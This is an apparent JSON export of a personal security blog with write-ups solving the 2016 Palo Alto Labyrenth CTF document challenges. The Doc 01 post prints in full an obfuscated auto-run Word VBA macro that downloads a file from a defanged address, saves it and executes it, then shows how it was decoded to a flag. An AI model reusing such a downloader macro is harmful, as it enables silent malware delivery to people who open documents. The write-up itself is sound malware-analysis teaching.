{"meta":{"title":"Crazy Dave's InterTube Emporium","subtitle":"where stuff goes to the corner","description":null,"author":"Crazy Dave","url":"https://dbheise.github.io"},"pages":[{"title":"Categories","date":"2016-08-13T17:03:14.520Z","updated":"2016-08-13T17:03:14.520Z","comments":true,"path":"categories/index.html","permalink":"https://dbheise.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2016-08-13T13:02:20.000Z","updated":"2016-08-13T17:02:20.265Z","comments":true,"path":"about/index.html","permalink":"https://dbheise.github.io/about/index.html","excerpt":"","text":""},{"title":"Tags","date":"2016-08-13T17:03:28.631Z","updated":"2016-08-13T17:03:28.631Z","comments":true,"path":"tags/index.html","permalink":"https://dbheise.github.io/tags/index.html","excerpt":"","text":""},{"title":"projects","date":"2016-08-13T13:49:43.000Z","updated":"2016-08-13T17:59:21.611Z","comments":true,"path":"projects/index.html","permalink":"https://dbheise.github.io/projects/index.html","excerpt":"","text":"FileId OLESS PyramidGame UriHandlers WinService"}],"posts":[{"title":"2016 Palo Alto Labyrenth CTF Doc 02","slug":"2016-Palo-Alto-Labyrenth-CTF-Doc-02","date":"2016-08-15T13:33:34.000Z","updated":"2016-08-15T18:39:55.617Z","comments":true,"path":"2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/","link":"","permalink":"https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-02/","excerpt":"","text":"So we solved the frist document and then they give us this…Document #2 (hash: ACCDF64EB1E96BE5A7C5F23DB6A74B88869E4F6C3B46D41F80B3063BF79AD05E) So again, run it through FileId tool and get the VBA code out (using the XML or JSON output options). 12345678Sub AutoOpen()&apos;&apos; crackme Macro&apos;&apos; UserForm1.ShowEnd Sub and12345678910111213141516171819202122232425262728293031323334353637383940414243Private Sub button_Click() x = suchcrypto(key.Text, &quot;General Vidal&quot;) If x = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot; Then MsgBox &quot;Wow. Good Job! Such crack.&quot; Else MsgBox &quot;U can do. Try harder...&quot; End IfEnd SubFunction suchcrypto(sMessage, strKey) Dim kLen, x, y, i, j, temp Dim s(256), k(256) kLen = Len(strKey) For i = 0 To 255 s(i) = i k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) Next j = 0 For i = 0 To 255 j = (j + k(i) + s(i)) Mod 256 temp = s(i) s(i) = s(j) s(j) = temp Next x = 0 y = 0 For i = 1 To 3072 x = (x + 1) Mod 256 y = (y + s(x)) Mod 256 temp = s(x) s(x) = s(y) s(y) = temp Next For i = 1 To Len(sMessage) x = (x + 1) Mod 256 y = (y + s(x)) Mod 256 temp = s(x) s(x) = s(y) s(y) = temp suchcrypto = suchcrypto &amp; (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) &amp; &quot;,&quot; NextEnd Function ok, so we show a form, get user input and then run the “button_Click“ subroutine…but look, we know what the answer should be when we read the IF statement. So basic algebra here…we know one of the two inputs, we have the function, and we know the output….we can brute force… ugh, brute forcing…and in VBA…ok if I have to…sigh. In retrospect, I can think of several other ways to attack this “crypto” other than brute forcing, but that’s what I did in the moment.12345678910Sub BruteEnForcer() ans = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot; k = &quot;General Vidal&quot; msg = &quot;&quot; Do Loop Until suchcrypto(msg, k) = ansEnd Sub ok, so now we have a simple logic/programming problem. We know what the result will be, but how can we figure out what the msg variable should be. How do we know when we are even close…are we going to iterate over all possible typable strings until we find a match? No, well we could, but no just no. You’ll notice there are a bunch of comma’s in the ‘answer’ string and based on the ‘decyption’ code it appends a comma after iterating over each letter in the message. So lets make that answer an array and go character by character until we get matches. I’m also going to limit it to alphanumeric characters, unless that doesn’t work. I would post by brute forcing code that I used, but I didn’t save it…so here’s some code that might work:123456789101112131415161718192021Sub BruteEnForcer() ans = &quot;171,184,42,184,88,26,47,154,20,219,203,130,52,19,180,214,156,94,186,74,30,248,119,235,139,130,175,141,179,197,8,204,252,&quot; k = &quot;General Vidal&quot; ansArry = Split(ans, &quot;,&quot;) msg = &quot;&quot; leng = 1 Do For i = 32 To 126 tmpMsg = msg + Chr(i) tmp = Split(suchcrypto(tmpMsg, k), &quot;,&quot;) If tmp(leng) = ansArry(leng) Then msg = tmpMsg leng = leng + 1 Exit For End If Next i Loop Until suchcrypto(msg, k) = ans MsgBox msgEnd Sub which when run gives us the following output:1PAN&#123;L4$t_Night_@f@iry_Vizited_M3&#125; gee that looks like it might be it… BOOM and we move on to doc #3","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://dbheise.github.io/tags/security/"},{"name":"CTF","slug":"CTF","permalink":"https://dbheise.github.io/tags/CTF/"},{"name":"maldoc","slug":"maldoc","permalink":"https://dbheise.github.io/tags/maldoc/"},{"name":"Labyrenth","slug":"Labyrenth","permalink":"https://dbheise.github.io/tags/Labyrenth/"}]},{"title":"2016 Palo Alto Labyrenth CTF - Doc 01","slug":"2016-Palo-Alto-Labyrenth-CTF-Doc-01","date":"2016-08-15T08:52:00.000Z","updated":"2016-08-15T17:30:54.323Z","comments":true,"path":"2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/","link":"","permalink":"https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-01/","excerpt":"","text":"On 2016-07-15 at 5pm EST Palo Alto Networks started a Capture the Flag competition with cash prizes called PAN Labyrenth CTF. When I looked at the challenges I noticed that there was a Documents track, and since there was a cash prize to the frist person to complete a given track I thought I’d give it a go..hey $1000 for a few hours is not bad. It only took me a few hours (actually more than I intended because I got stuck overthinking one of the problems), but I don’t think I was the first one to complete the track. Regardless, I thought I’d share the steps I went through to solve each of the challenges. So to get starting running the CTF you need the initial code for the DOCs track which is found on the getting started page…it was PAN{DOCS_START}. Upon entering this you are given a zip file to download (hash:846CBD76B491FD6F74212A4259FE933A0FEBF3E5EA93D24A91241EDCD98D5EDC). This file contains two items, one the first document named challenge.doc (hash:9BBEDADF4A5A9CC75DDA5F4CCE7416BEDD1B2221BF80BF6C3CC73DFEE9A337CD), and the second is a file simply named “.7z” (hash:B588AAC998556D1F853AD8C3D4D428CEB26B7D38CFD073CC77C82F4C6EF4FA97). We’ll come back to this file in a little bit (as it is a shortcut), but let start with the other file “”. So what do you do first? Open the file in word? Are you a n00b or insane? probably a little of both…if you’re going to go this route, please make sure that you’re doing it on a machine you can easily clean and have some sort of network monitoring turned on….or a sandbox of somesort. So you can just open it if you trust the document or know what you’re doing…but don’t trust it, are you even sure its actually a document? You need a tool to determine as much as you can without running it…this is static analysis. Personal I lean on tools that I’ve written, but there are lots of great tools out there and I’m not trying to steer you away or towards any particular tool…I’m just showing you what I did. So we run it through my FileId tool and get the VBA code out (using the XML or JSON output options). You could also use many other tools, for example: OleTools Philippe Lagadec, or OleDump by Didier Stevens. In the end you get this code:123456789101112131415161718192021222324252627282930313233343536373839404142434445Private Function QklkhFEQNB(HGKuttPaRM As Variant, UBvkWqzieX As Integer) Dim gsFEVmmIzO, vSHOfSrEta As String, dHLdiEqdts, eUTAbMoUIA vSHOfSrEta = ActiveDocument.Variables(&quot;ppKzr&quot;).Value() gsFEVmmIzO = &quot;&quot; dHLdiEqdts = 1 While dHLdiEqdts &lt; UBound(HGKuttPaRM) + 2 eUTAbMoUIA = dHLdiEqdts Mod Len(vSHOfSrEta): If eUTAbMoUIA = 0 Then eUTAbMoUIA = Len(vSHOfSrEta) gsFEVmmIzO = gsFEVmmIzO + Chr(Asc(Mid(vSHOfSrEta, eUTAbMoUIA + UBvkWqzieX, 1)) Xor CInt(HGKuttPaRM(dHLdiEqdts - 1))) dHLdiEqdts = dHLdiEqdts + 1 Wend QklkhFEQNB = gsFEVmmIzOEnd FunctionPublic Function BkAIuNwQNDkohBY() twOvwCSTPL = QklkhFEQNB(Array(5, 5, 27, 65, 89, 98, 85, 86, 71, 75, 66, 92, 95, 98, 67, 64, 89, 83, 84, 95, 26, _ 78, 116, 78, 91, 5, 116, 32, 72, 2, 33, 48, 10, 29, 61, 8, 37, 20, 63, 44, 1, _ 12, 62, 38, 47, 52, 99, 57, 5, 121, 89, 37, 65, 32, 32, 11, 98, 42, 58, 32, 28, _ 9, 3, 117, 85, 4, 57, 10, 94, 0, 16, 8, 28, 42, 30, 121, 71, 6, 8, 9, 37, _ 2, 23, 34, 21, 120, 54, 7, 40, 35, 75, 50, 87, 3, 55, 47, 99, 52, 13, 0, 42, _ 30, 27, 126, 59, 3, 123, 29, 52, 44, 53, 29, 15, 50, 12, 35, 8, 48, 89, 54, 27, _ 62, 28, 8, 36, 49, 119, 104, 14, 5, 64, 34, 43, 22, 71, 5, 46, 7, 66, 42, 0, _ 1, 113, 97, 83, 31, 45, 95, 111, 31, 40, 51), 24) UkIWIEtqCF = QklkhFEQNB(Array(42, 115, 2), 188) Dim xHttp: Set xHttp = CreateObject(QklkhFEQNB(Array(116, 7, 6, 74, 60, 43, 42, 36, 64, 70, 110, 27, 28, 12, 12, 17, 23), 0)) Dim bStrm: Set bStrm = CreateObject(QklkhFEQNB(Array(15, 32, 32, 53, 35, 89, 22, 25, 65, 53, 51, 26), 176)) xHttp.Open UkIWIEtqCF, twOvwCSTPL, False xHttp.Send With bStrm .Type = 1 .Open .write xHttp.responseBody .savetofile QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17), 2 End With Shell (QklkhFEQNB(Array(20, 39, 81, 118, 52, 78, 11), 17))End FunctionPrivate Sub Document_Open() If ActiveDocument.Variables(&quot;ppKzr&quot;).Value &lt;&gt; &quot;toto&quot; Then BkAIuNwQNDkohBY ActiveDocument.Variables(&quot;ppKzr&quot;).Value = &quot;toto&quot; If ActiveDocument.ReadOnly = False Then ActiveDocument.Save End If End IfEnd Sub Looking at this code I can see a couple of things that stand out: the QklkhFEQNB function is the string deobfuscation function. You can tell this by its frequency of use and its always called before the string is needed (look for CreateObject) it does have an autorun functionality (i.e. “Document_Open”), so if we had opened the file and ran the macros it would have done its business What is its business, well without too much digging we can see that it has a variable named xHttp and xStrm in the BkAIuNwQNDkohBY function and we can see that there is a Shell command. Often variable names are also obfuscated in malicious documents so the fact that they aren’t kind of stands out. So it downloads something, saves it to disk, and executes it. So first things first we want to see to where it calls home. To accomplish this we have the deobfuscation function in VBA, so lets open M$Word, create a new document, open up the VBA Editor and drop it in. If you do this you will see that it won’t quite work that simply. If you look carefully at the deobfuscation function you’ll notice it references a document variable:1ActiveDocument.Variables(&quot;ppKzr&quot;).Value() and in the Document_Open subroutine it references this same variable and sets it to “toto”. Knee-jerk reaction replace that with the static string “toto”….nope won’t work, remember the way the code is written it must NOT be “toto” at first. So we have a couple of options at this point: We can brute force the value for the “ppKzr” variable We can try to look up the value We can just run it though a sandbox, or something monitoring the network traffic involved At this point I honestly went with option #3 (but we’ll come back to the other two options in other documents in this CTF track)…it was easy and quick. In the end we have this URL that it tries to call home to (defanged):1hXXp://&#123;REDACTED RFC1918 IPv4&#125;/b64/x58/MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=/evil.executes well that IP doesn’t help us, its a RFC1918 (or via Wikipedia) private block…but hmmm, that blob in the middle looks base64 encoded…and it even says “b64” but it also has a 0x58 before the blob…we’ll come back to that. So you run the “MDgx…jU=” string through your base64 decoder of choice (I used powershell): 12$s1 = &quot;MDgxOTE2MjMwZTMxMDIzMTNhNjk2YjA3NjgzNjM0MjE2YTJjMzA2ODJiNmIwNzBmMzA2ODA3MTMz\\nNjY4MmYwNzJmMzA2YjJhNmI2YTM0Njg2ODMzMjU=&quot;[Convert]::FromBase64String($s1) You run the above and you’ll get an error immediate error:12Exception calling &quot;FromBase64String&quot; with &quot;1&quot; argument(s): &quot;The input is not a valid Base-64 string as it contains a non-base 64character, more than two padding characters, or an illegal character among the padding characters. &quot; Not a valid base64 string?? hmmm…lets look at that string again…wait there’s a “\\n” in that string….ok so we can either take it out or make sure powershell properly escapes it…just change “\\n” to “`n” as this is how powershell escapes stuff. So we run it through the base64 decoding function again and it works…but its just a bunch of bytes…but wait there all in a small range. Taking a guess that its an ASCII string I’ll run this powershell command:1[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($s1)) boom and I get a string (shortened for brevity):1081916230e3102313a696b07683634216...68071336682f072f306b2a6b6a3468683325 well that isn’t very interesting, but I think I’m stil on the right track. Now I need to go back to the 0x58…hmmm…I wonder if this an XOR string and perhaps the 0x58 is the key. How would I check this? I’ll turn to another tool DataConverter by Kahu Security (of course there are other tools…) So I put our string in and mark it as Hex format (looks hex to me), and enter our hex key 0x58 and we get (key is REDACTED for you pleasure):1PAN&#123;_REDACTED_&#125; huh…PAN{blahblahblah} that looks like the key we entered to get this started…lets try it out… POOF …it works and we get doc02","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://dbheise.github.io/tags/security/"},{"name":"CTF","slug":"CTF","permalink":"https://dbheise.github.io/tags/CTF/"},{"name":"maldoc","slug":"maldoc","permalink":"https://dbheise.github.io/tags/maldoc/"},{"name":"Labyrenth","slug":"Labyrenth","permalink":"https://dbheise.github.io/tags/Labyrenth/"}]},{"title":"Stuff and things yet to do","slug":"Stuff-and-things-yet-to-do","date":"2016-08-13T14:08:12.000Z","updated":"2016-08-13T19:04:35.113Z","comments":true,"path":"2016/08/13/Stuff-and-things-yet-to-do/","link":"","permalink":"https://dbheise.github.io/2016/08/13/Stuff-and-things-yet-to-do/","excerpt":"","text":"so one of the things this blog is going to try to accomplish is collect all the various items that I’ve put on various places in the web. This means old school projects/papers/writings/thoughts as well as linking to &amp; copying of content that I’ve produced that lives elsewhere on the web. We’ll see how it goes…","categories":[],"tags":[{"name":"halfthoughts","slug":"halfthoughts","permalink":"https://dbheise.github.io/tags/halfthoughts/"}]},{"title":"first","slug":"first","date":"2016-08-13T13:29:53.000Z","updated":"2016-08-13T17:30:59.548Z","comments":true,"path":"2016/08/13/first/","link":"","permalink":"https://dbheise.github.io/2016/08/13/first/","excerpt":"","text":"so i’m trying to start to blog again…not because I want to talk, but because I want one consistant place to put everything… we’ll see how it goes!","categories":[],"tags":[{"name":"obligitory","slug":"obligitory","permalink":"https://dbheise.github.io/tags/obligitory/"}]}]}